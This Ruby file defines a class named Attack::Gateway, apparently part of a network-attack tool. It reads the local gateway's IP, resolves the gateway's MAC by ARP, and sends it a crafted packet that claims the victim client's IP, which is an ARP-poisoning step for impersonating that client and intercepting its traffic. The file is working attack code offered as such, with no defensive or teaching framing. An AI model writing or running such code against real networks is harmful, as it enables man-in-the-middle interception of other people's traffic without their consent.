module Attack
  class Gateway < Base

    def process
      gw_ip = `netstat -rn | grep 0.0.0.0 | awk '{print $2}' | grep -v "0.0.0.0"`
      gw_mac = PacketFu::Utils::arp(gw_ip, :iface => interface)

      config.source_mac.nil? ? saddr = self_mac(interface) : saddr = config.source_mac

      daddr    = gw_mac
      saddr_ip = config.client_ip
      daddr_ip = gw_ip

      crafted_packet = packet_craft(saddr, daddr, saddr_ip, daddr_ip, saddr_ip, config.delay, interface)
      send_packet(config.delay, config.interface, crafted_packet)
    end

  end
end
